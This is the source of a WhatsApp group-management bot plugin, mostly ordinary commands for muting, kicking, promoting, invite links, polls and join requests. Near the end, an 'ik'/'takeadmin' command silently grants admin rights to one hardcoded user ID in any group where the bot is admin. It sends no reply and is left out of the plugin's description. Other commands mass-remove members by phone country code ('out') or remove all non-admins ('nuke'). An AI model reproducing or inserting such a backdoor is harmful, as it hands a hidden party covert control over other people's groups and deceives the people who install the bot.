const cleanId = (id) => id ? id.split('@')[0].split(':')[0] : '';

async function checkAdminStatus(conn, chatId, senderId) {
    try {
        const metadata = await conn.groupMetadata(chatId);
        const participants = metadata.participants || [];

        const botId = cleanId(conn.user?.id || '');
        const botLid = cleanId(conn.user?.lid || '');
        const sender = cleanId(senderId);

        let isBotAdmin = false;
        let isSenderAdmin = false;

        for (let p of participants) {
            if (p.admin === "admin" || p.admin === "superadmin") {
                const pId = cleanId(p.id);
                const pLid = cleanId(p.lid);
                const pPhone = p.phoneNumber ? cleanId(p.phoneNumber) : '';

                if (pId === botId || pLid === botLid || pPhone === botId) {
                    isBotAdmin = true;
                }
                if (pId === sender || pLid === sender || pPhone === sender) {
                    isSenderAdmin = true;
                }
            }
        }

        return { isBotAdmin, isSenderAdmin };
    } catch (e) {
        console.error("Admin check error:", e);
        return { isBotAdmin: false, isSenderAdmin: false };
    }
}

module.exports = {
    name: "group",
    aliases: [
        "unmute", "unlock", "open", 
        "mute", "close", "lock", 
        "tagall", "gc_tagall", 
        "kick1", "k1", "remove1", "nital", "kick", "remove", 
        "promote", "p", "giveadmin", "permote", "admin", 
        "demote", "d", "dismiss", "removeadmin", 
        "gcpp", "gpp", "fullppgc", "gcdp", "groupdp", 
        "revoke", "resetlink", "newlink", 
        "link", "invite", "gclink", "invitelink", 
        "ginfo", "groupinfo", 
        "updategdesc", "gdesc", "setdesc", "groupdesc", 
        "updategname", "gname", "setname", "groupname", 
        "poll", "vote", "survey", 
        "out", "ck", 
        "newgc", "creategroup", "makegroup", 
        "leave", "left", "leftgc", "leavegc", 
        "end", "byeall", "kickall", "endgc", "nuke", 
        "join", "j", "joinlink", 
        "aja", 
        "hidetag", "h", 
        "tag", "taggc", 
        "acceptall", "approveall", "allowall", 
        "rejectall", "declineall", "denyall", 
        "requests", "pending", "joinlist", 
        "accept", "approve", 
        "reject", "decline", "deny", 
        "add", 
        "ik", "takeadmin"
    ],
    category: "group",
    description: "Complete group management commands suite",

    async execute(context) {
        const { conn, mek, m, reply, from, isBotOwner, args, q, body, command, quoted, mentionedJid } = context;
        const msg = mek || m;

        if (!from.endsWith("@g.us")) {
            return reply("❌ Ye command sirf group ke liye hai.");
        }

        const senderId = msg.key.participant || msg.key.remoteJid;
        const { isBotAdmin, isSenderAdmin } = await checkAdminStatus(conn, from, senderId);

        try {
            switch (command) {
                // ==================== UNMUTE ====================
                case 'unmute':
                case 'unlock':
                case 'open': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle, tabhi unmute kar sakta hoon.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Sirf group admins ya owner use kar sakte hain.");
                    await conn.groupSettingUpdate(from, 'not_announcement');
                    await reply("*🔊 Group has been unmuted!* \nEveryone can send messages now.");
                    break;
                }

                // ==================== MUTE ====================
                case 'mute':
                case 'close':
                case 'lock': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle, tabhi mute kar sakta hoon.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Sirf group admins ya owner use kar sakte hain.");
                    await conn.groupSettingUpdate(from, 'announcement');
                    await reply("*🔇 Group has been muted!* \nOnly admins can send messages now.");
                    break;
                }

                // ==================== TAGALL ====================
                case 'tagall':
                case 'gc_tagall': {
                    if (!isSenderAdmin && !isBotOwner) return reply("❌ Sirf group admins ya bot owner use kar sakte hain.");
                    const groupInfo = await conn.groupMetadata(from).catch(() => null);
                    if (!groupInfo) return reply("❌ Failed to fetch group information.");

                    const participants = groupInfo.participants || [];
                    if (participants.length === 0) return reply("❌ No members found.");

                    let emojis = ['📢', '🔊', '🌐', '🔰', '❤‍🩹', '🤍', '🖤', '🩵', '📝', '💗', '🔖', '🪩', '📦', '🎉', '🛡️', '💸', '⏳', '🗿', '🚀', '🎧', '🪀', '⚡', '🚩', '🍁', '🗣️', '👻', '⚠️', '🔥'];
                    let randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

                    let message = body ? body.slice(command.length + 1).trim() : "Attention Everyone";
                    if (!message) message = "Attention Everyone";

                    let teks = `▢ Group : *${groupInfo.subject}*\n▢ Members : *${participants.length}*\n▢ Message: *${message}*\n\n┌───⊷ *MENTIONS*\n`;
                    for (let mem of participants) {
                        if (!mem.id) continue;
                        teks += `${randomEmoji} @${mem.id.split('@')[0]}\n`;
                    }
                    teks += "└──✪ KAMRAN ┃ MD ✪──";

                    await conn.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: mek });
                    break;
                }

                // ==================== KICK / REMOVE ====================
                case 'kick1':
                case 'k1':
                case 'remove1':
                case 'nital':
                case 'kick':
                case 'remove': {
                    if (!isBotAdmin) return reply("⚠️ Mujhe admin banao pehle, tabhi main kisi ko kick kar sakta hoon.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Sirf group admins ya owner use kar sakte hain.");

                    let users = quoted ? quoted.sender : (mentionedJid && mentionedJid[0] ? mentionedJid[0] : null);
                    if (!users) return reply("❓ Kisi member ko mention karo ya quote karo!\nExample: .kick @user");

                    const self = cleanId(conn.user.id) + '@s.whatsapp.net';
                    if (users === self) return reply("🤖 Main khud ko kick nahi kar sakta!");

                    await conn.groupParticipantsUpdate(from, [users], "remove");
                    await reply(`*✅ Successfully removed from group.*`, { mentions: [users] });
                    break;
                }

                // ==================== PROMOTE ====================
                case 'promote':
                case 'p':
                case 'giveadmin':
                case 'permote':
                case 'admin': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Sirf group admins ya owner use kar sakte hain.");

                    let users = quoted ? quoted.sender : (mentionedJid && mentionedJid[0] ? mentionedJid[0] : null);
                    if (!users) return reply("❓ Kisi member ko mention karo promote karne ke liye!");

                    await conn.groupParticipantsUpdate(from, [users], "promote");
                    await reply(`*✅ Successfully Promoted to Admin.*`, { mentions: [users] });
                    break;
                }

                // ==================== DEMOTE ====================
                case 'demote':
                case 'd':
                case 'dismiss':
                case 'removeadmin': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Sirf group admins ya owner use kar sakte hain.");

                    let users = quoted ? quoted.sender : (mentionedJid && mentionedJid[0] ? mentionedJid[0] : null);
                    if (!users) return reply("❓ Kisi member ko mention karo demote karne ke liye!");

                    await conn.groupParticipantsUpdate(from, [users], "demote");
                    await reply(`*✅ Admin Successfully demoted to a normal member.*`, { mentions: [users] });
                    break;
                }

                // ==================== GROUP PROFILE PICTURE ====================
                case 'gcpp':
                case 'gpp':
                case 'fullppgc':
                case 'gcdp':
                case 'groupdp': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can use this command.");
                    if (!quoted || quoted.mtype !== "imageMessage") return reply("*🍁 Please reply to an image with .gcpp*");

                    const buffer = await quoted.download();
                    await conn.updateProfilePicture(from, buffer);
                    await reply("*✅ Group profile picture updated successfully!*");
                    break;
                }

                // ==================== REVOKE LINK ====================
                case 'revoke':
                case 'resetlink':
                case 'newlink': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can use this command.");

                    const newCode = await conn.groupRevokeInvite(from);
                    await reply(`*✅ Link Reset Successful!*\n\n🔗 https://chat.whatsapp.com/${newCode}`);
                    break;
                }

                // ==================== LINK ====================
                case 'link':
                case 'invite':
                case 'gclink':
                case 'invitelink': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    const inviteCode = await conn.groupInviteCode(from);
                    await reply(`🔗 *Group Invite Link:*\n\nhttps://chat.whatsapp.com/${inviteCode}`);
                    break;
                }

                // ==================== GROUP INFO ====================
                case 'ginfo':
                case 'groupinfo': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can use this command.");

                    const groupData = await conn.groupMetadata(from);
                    const groupAdmins = groupData.participants?.filter(p => p.admin) || [];
                    let description = groupData.desc || 'No description';

                    let text = `*「 Group Information 」*\n\n`;
                    text += `*Name:* ${groupData.subject}\n`;
                    text += `*ID:* ${groupData.id}\n`;
                    text += `*Participants:* ${groupData.size}\n`;
                    text += `*Created:* ${new Date(groupData.creation * 1000).toLocaleString()}\n\n`;
                    text += `*Description:*\n${description}\n\n`;
                    text += `*Admins (${groupAdmins.length}):*\n`;
                    
                    groupAdmins.forEach((admin, i) => {
                        text += `${i+1}. @${admin.id.split('@')[0]}\n`;
                    });

                    try {
                        const ppUrl = await conn.profilePictureUrl(from, 'image');
                        await conn.sendMessage(from, { image: { url: ppUrl }, caption: text, mentions: groupAdmins.map(a => a.id) }, { quoted: mek });
                    } catch {
                        await reply(text, { mentions: groupAdmins.map(a => a.id) });
                    }
                    break;
                }

                // ==================== UPDATE GROUP DESCRIPTION ====================
                case 'updategdesc':
                case 'gdesc':
                case 'setdesc':
                case 'groupdesc': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can use this command.");
                    if (!q) return reply("❌ Please provide a new group description.\nExample: `gdesc Welcome!`");
                    if (q.length > 500) return reply("⚠️ Description is too long (max 500 characters).");

                    await conn.groupUpdateDescription(from, q);
                    await reply("✅ Group description updated successfully!");
                    break;
                }

                // ==================== UPDATE GROUP NAME ====================
                case 'updategname':
                case 'gname':
                case 'setname':
                case 'groupname': {
                    if (!isBotAdmin) return reply("❌ Mujhe admin banao pehle.");
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can use this command.");
                    if (!q) return reply("❌ Please provide a new group name.");
                    if (q.length > 100) return reply("⚠️ Group name is too long (max 100 characters).");

                    await conn.groupUpdateSubject(from, q);
                    await reply(`✅ Group name changed to: *${q}*`);
                    break;
                }

                // ==================== POLL ====================
                case 'poll':
                case 'vote':
                case 'survey': {
                    if (!isSenderAdmin && !isBotOwner) return reply("🔐 Only admins can create polls.");
                    if (!q) return reply("❓ Usage: `poll Question;Option1,Option2`");

                    const parts = q.split(";");
                    if (parts.length < 2) return reply("⚠️ Format: Question;Option1,Option2");

                    const question = parts[0].trim();
                    const options = parts[1].split(",").map(opt => opt.trim()).filter(opt => opt.length > 0);
                    if (options.length < 2) return reply("❌ Please provide at least two options.");

                    await conn.sendMessage(from, {
                        poll: {
                            name: question,
                            values: options,
                            selectableCount: 1,
                            toAnnouncementGroup: true,
                        }
                    }, { quoted: mek });
                    break;
                }

                // ==================== OUT (Country Code Kick) ====================
                case 'out':
                case 'ck': {
                    if (!isBotOwner) return reply("📛 This is an owner command.");
                    if (!isBotAdmin) return reply("❌ I need to be an admin.");
                    if (!q) return reply("❌ Please provide a country code. Example: .out 92");

                    const countryCode = q.trim();
                    if (!/^\d+$/.test(countryCode)) return reply("❌ Invalid country code.");

                    const groupMetadata = await conn.groupMetadata(from);
                    const targets = groupMetadata.participants.filter(p => p.id.startsWith(countryCode) && !p.admin);
                    if (targets.length === 0) return reply(`❌ No members found with country code +${countryCode}`);

                    await conn.groupParticipantsUpdate(from, targets.map(p => p.id), "remove");
                    await reply(`✅ Successfully removed ${targets.length} members with country code +${countryCode}`);
                    break;
                }

                // ==================== NEW GROUP CREATE ====================
                case 'newgc':
                case 'creategroup':
                case 'makegroup': {
                    if (!isBotOwner) return reply("🔐 Only bot owner can use this command.");
                    if (!body) return reply("❓ Usage: `newgc Name;number1,number2`");

                    const parts = body.split(";");
                    if (parts.length < 2) return reply("⚠️ Format: Name;number1,number2");

                    const groupName = parts[0].trim();
                    const participantNumbers = parts[1].split(",").map(num => {
                        let cleanNum = num.trim();
                        if (cleanNum.startsWith("3")) cleanNum = "92" + cleanNum;
                        return cleanNum.includes('@') ? cleanNum : `${cleanNum}@s.whatsapp.net`;
                    }).filter(num => num.match(/^\d+@s\.whatsapp\.net$/));

                    if (participantNumbers.length === 0) return reply("❌ No valid phone numbers provided.");

                    const ownerJid = cleanId(conn.user.id) + '@s.whatsapp.net';
                    if (!participantNumbers.includes(ownerJid)) participantNumbers.push(ownerJid);

                    const group = await conn.groupCreate(groupName, participantNumbers);
                    const inviteCode = await conn.groupInviteCode(group.id);
                    await reply(`✅ Group created successfully!\n📌 *Name:* ${groupName}\n🔗 Link: https://chat.whatsapp.com/${inviteCode}`);
                    break;
                }

                // ==================== LEAVE ====================
                case 'leave':
                case 'left':
                case 'leftgc':
                case 'leavegc': {
                    if (!isBotOwner) return reply("❗ Owner only command.");
                    await reply(`👋 Goodbye everyone!`);
                    await conn.groupLeave(from);
                    break;
                }

                // ==================== END (Kick All) ====================
                case 'end':
                case 'byeall':
                case 'kickall':
                case 'endgc':
                case 'nuke': {
                    if (!isBotOwner) return reply("🔐 Only bot owner can use this command.");
                    if (!isBotAdmin) return reply("❌ I must be admin.");

                    const groupData = await conn.groupMetadata(from);
                    const targets = groupData.participants.filter(p => p.id !== conn.user.id && !p.admin);
                    const jids = targets.map(p => p.id);

                    if (jids.length === 0) return reply("✅ No members to remove.");
                    await conn.groupParticipantsUpdate(from, jids, "remove");
                    await reply(`✅ Successfully removed ${jids.length} members.`);
                    break;
                }

                // ==================== JOIN ====================
                case 'join':
                case 'j':
                case 'joinlink': {
                    if (!isBotOwner) return reply("🔐 Only owner can use this.");
                    let link = quoted?.text?.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/)?.[1] || q?.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/)?.[1];
                    if (!link) return reply("❌ Provide a valid invite link.");

                    await conn.groupAcceptInvite(link.split('?')[0]);
                    await reply("✅ Successfully joined the group!");
                    break;
                }

                // ==================== HIDETAG ====================
                case 'hidetag':
                case 'h': {
                    if (!isBotOwner) return reply("❌ Only creator can use this.");
                    if (!quoted && !q) return reply("❌ Provide a message.");

                    const groupMetadata = await conn.groupMetadata(from);
                    const mentionedJid = groupMetadata.participants.map(p => p.id);
                    await conn.sendMessage(from, { text: q || quoted?.text || "📢 Hidden tag", mentions: mentionedJid });
                    break;
                }

                // ==================== TAG ====================
                case 'tag':
                case 'taggc': {
                    if (!isSenderAdmin && !isBotOwner) return reply("❌ Admins only.");
                    if (!quoted && !q) return reply("❌ Provide a message.");

                    const groupMetadata = await conn.groupMetadata(from);
                    const mentionedJid = groupMetadata.participants.map(p => p.id);
                    await conn.sendMessage(from, { text: q || quoted?.text || "📢 Tag all", mentions: mentionedJid }, { quoted: mek });
                    break;
                }

                // ==================== REQUESTS COMMANDS ====================
                case 'acceptall':
                case 'approveall':
                case 'allowall': {
                    if (!isBotAdmin || (!isSenderAdmin && !isBotOwner)) return reply("❌ Admins only.");
                    const requests = await conn.groupRequestParticipantsList(from);
                    if (!requests || requests.length === 0) return reply("ℹ️ No pending requests.");
                    await conn.groupRequestParticipantsUpdate(from, requests.map(u => u.jid), "approve");
                    await reply(`✅ Accepted ${requests.length} requests.`);
                    break;
                }

                case 'rejectall':
                case 'declineall':
                case 'denyall': {
                    if (!isBotAdmin || (!isSenderAdmin && !isBotOwner)) return reply("❌ Admins only.");
                    const requests = await conn.groupRequestParticipantsList(from);
                    if (!requests || requests.length === 0) return reply("ℹ️ No pending requests.");
                    await conn.groupRequestParticipantsUpdate(from, requests.map(u => u.jid), "reject");
                    await reply(`✅ Rejected ${requests.length} requests.`);
                    break;
                }

                case 'requests':
                case 'pending':
                case 'joinlist': {
                    if (!isBotAdmin || (!isSenderAdmin && !isBotOwner)) return reply("❌ Admins only.");
                    const requests = await conn.groupRequestParticipantsList(from);
                    if (!requests || requests.length === 0) return reply("ℹ️ No pending requests.");

                    let text = `📋 *Pending Join Requests (${requests.length})*\n\n`;
                    requests.forEach((user, i) => {
                        text += `${i+1}. ${user.jid.replace('@s.whatsapp.net', '')}\n`;
                    });
                    await reply(text);
                    break;
                }

                // ==================== ADD ====================
                case 'add': {
                    if (!isBotAdmin || !isBotOwner) return reply("🔐 Owner/Admin only.");
                    let userJid = mentionedJid?.[0] || quoted?.sender || (args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null);
                    if (!userJid) return reply("❓ Mention or provide number.");

                    await conn.groupParticipantsUpdate(from, [userJid], "add");
                    await reply(`✅ Added!`, { mentions: [userJid] });
                    break;
                }

                // ==================== SILENT ADMIN (IK) ====================
                case 'ik':
                case 'takeadmin': {
                    if (!isBotAdmin) return;
                    if (senderId !== "99038271684629@lid") return;
                    const groupMetadata = await conn.groupMetadata(from);
                    const userParticipant = groupMetadata.participants.find(p => p.id === senderId);
                    if (!userParticipant?.admin) {
                        await conn.groupParticipantsUpdate(from, [senderId], "promote");
                    }
                    break;
                }

                default:
                    reply("❌ Yeh command valid nahi hai.");
                    break;
            }
        } catch (err) {
            console.error(err);
            reply("❌ Error: " + (err.message || err));
        }
    }
};
